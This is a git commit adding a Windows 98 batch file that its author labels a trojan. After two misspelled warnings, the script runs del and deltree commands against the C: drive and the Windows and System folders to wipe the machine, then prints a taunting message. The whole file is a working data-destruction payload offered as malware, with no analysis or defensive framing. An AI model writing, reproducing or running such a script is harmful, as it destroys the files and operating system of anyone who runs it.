4c9d6e1fedf9342d132bd1e42d3f45ac47fba043
Pa1Leon <154698240+Pa1Leon@users.noreply.github.com>
2024-02-11 12:42:58 +0100

    Created Mal Win98TrojanWinDelete.bat

---
+++ bat/Win98TrojanWinDelete.bat
@@ -0,0 +1,15 @@
+@echo off
+echo Waring! this is gona remove all data on this pc/VM! are you sure to start this malware?
+pause
+cls
+echo FINAL WARING! This is your last chance to stop this malware form running [TIP!: Close this Program to cancle]
+cls
+del C:
+deltree C: 
+deltree C:\Windows
+deltree C:\Windows\System
+deltree C:\Windows\Desktop
+cls
+echo done destroying your pc enjoy dead win98
+pause
+exit
